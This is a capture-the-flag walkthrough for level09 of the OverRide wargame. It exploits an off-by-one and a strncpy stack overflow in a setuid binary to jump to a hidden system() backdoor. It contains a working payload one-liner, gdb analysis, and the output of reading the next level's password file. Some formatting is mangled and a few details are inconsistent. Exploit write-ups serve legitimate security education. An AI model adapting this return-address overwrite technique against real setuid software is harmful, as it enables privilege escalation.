# Level09 Walkthrough
## Initial Analysis
### 1. Examine the Binary
```bash
level09@OverRide:~$ ls -la
total 17
dr-xr-x---+ 1 level09 level09   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level09 level09  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level09 level09 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 end    users   6840 Sep 10  2016 level09
-rw-r--r--+ 1 level09 level09   41 Oct 19  2016 .pass
-rw-r--r--  1 level09 level09  675 Sep 10  2016 .profile
```
**Key observations:**

setuid and setgid binary (s flags in permissions)

Owned by end user (the final level!)

When executed, runs with end privileges

## 2. Test Basic Execution
```bash
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: test
>: Welcome, test
>: Msg @Unix-Dude
>>: hello
>: Msg sent!
```
**Observations:**

Program asks for username and message

Displays a welcome message

No obvious error messages

## Reverse Engineering
### 3. Function Analysis
```bash
(gdb) info functions
All defined functions:
0x0000000000000720  strncpy@plt
0x0000000000000730  puts@plt
0x0000000000000740  system@plt
0x0000000000000750  printf@plt
0x0000000000000770  fgets@plt
0x000000000000088c  secret_backdoor
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
0x0000000000000aa8  main
```

## The Vulnerabilities
### 4. Vulnerability 1 - Off-by-One in set_username
In set_username, the loop condition is i <= 40:

```c
for (i = 0; i <= 40 && buffer[i]; i++)
    message->user[i] = buffer[i];
```
But message->user is only 40 bytes (indices 0-39). This allows writing 1 extra byte into message->len (which immediately follows user in memory).

```text
Memory layout of t_message:
+------------------+
| msg[140]         |
+------------------+
| user[40]         |
+------------------+
| len (4 bytes)    | ← We can overwrite 1 byte of this!
+------------------+
```
### 5. Vulnerability 2 - strncpy with User-Controlled Length
In set_msg:

```c
strncpy(message->msg, buffer, message->len);
Since we can control message->len (up to 255 due to the 1-byte overflow), we can write up to 255 bytes into a 140-byte buffer, causing a buffer overflow on the stack!
```
### 6. The Stack Layout
The msg structure is allocated on the stack in handle_msg at rbp-0xc0 (192 bytes from rbp).

```text
Stack layout of handle_msg:

Higher addresses
+--------------------------+
| return address           | ← rbp+8 (our target)
+--------------------------+
| saved rbp                | ← rbp
+--------------------------+
| msg struct (192 bytes)   | ← rbp-0xc0
|   msg[140]               |
|   user[40]               |
|   len (4)                |
+--------------------------+
Lower addresses
```
### 7. Finding the Offset
From GDB:

```bash
(gdb) b *handle_msg+112  # Before leave
(gdb) r
(gdb) info registers
rbp            0x7fffffffe5c0
rsp            0x7fffffffe500
Buffer starts at rbp-0xc0 = 0x7fffffffe500

Return address is at rbp+8 = 0x7fffffffe5c8
```
Offset to return address:

```text
0x7fffffffe5c8 - 0x7fffffffe500 = 0xc8 = 200 bytes
We need to write 200 bytes to reach the return address!

. The secret_backdoor Function
The program has a hidden function:
```
```c
void secret_backdoor(void) {
    char buffer[128];
    fgets(buffer, 128, stdin);
    system(buffer);
}
```
This function executes any command we provide! We just need to jump to it.

**Address of secret_backdoor:**

```bash
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```
### 8. Calculating the len Overwrite
We need to write 200 bytes to reach the return address, plus 8 bytes for the address itself = 208 bytes total.

So we must set message->len = 208 (0xd0 in hex).

**Exploitation**
### 9. Building the Payload
Step 1: Username payload (40 bytes + 1 byte overflow)

40 bytes of padding (any characters)

1 byte to overwrite len with 0xd0 (208)

Newline to send the input

```python
username = '\x90' * 40 + '\xd0' + '\n'
Step 2: Message payload (200 bytes padding + 8 bytes address)

200 bytes of padding (NOP sled or any characters)

8 bytes for secret_backdoor address in little-endian

No newline needed (cat will keep stdin open)
```
```python
secret_backdoor_addr = '\x00\x00\x55\x55\x55\x55\x48\x8c'
message = '\x90' * 200 + secret_backdoor_addr[::-1]
Step 3: Combine and send
```
```bash
(python -c "print('\x90' * 40 + '\xd0' + '\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1])" && cat) | ./level09
```
### 10. Getting the Final Flag
```bash
level09@OverRide:~$ (python -c "print('\x90' * 40 + '\xd0' + '\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1])" && cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
### 11. Switch to end user
```bash
level09@OverRide:~$ su end
Password: j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
end@OverRide:~$ cat end
Congratulations graduate!
```
### Vulnerability Summary
## Root Cause:
Off-by-one error: Loop writes 41 bytes into a 40-byte buffer, overwriting the adjacent len field

Unbounded strncpy: User-controlled length allows overflow of the msg buffer

Hidden function: secret_backdoor() provides a direct way to execute commands

## Exploitation Technique:
Overwrite len: Set len = 208 via username overflow

Buffer overflow: In set_msg, write 208 bytes into 140-byte buffer

Return address overwrite: Overwrite return address with secret_backdoor

Command execution: secret_backdoor() reads and executes any command

**Key Learning Points:**
Structure layout matters for exploitation

Off-by-one errors can be powerful (overwrite adjacent fields)

strncpy with user-controlled length is dangerous

Hidden functions are common in CTF challenges

64-bit addresses require 8 bytes (little-endian)

## Final Commands
```bash
(python -c "print('\x90' * 40 + '\xd0' + '\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1])" && cat) | ./level09
Password for end: j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
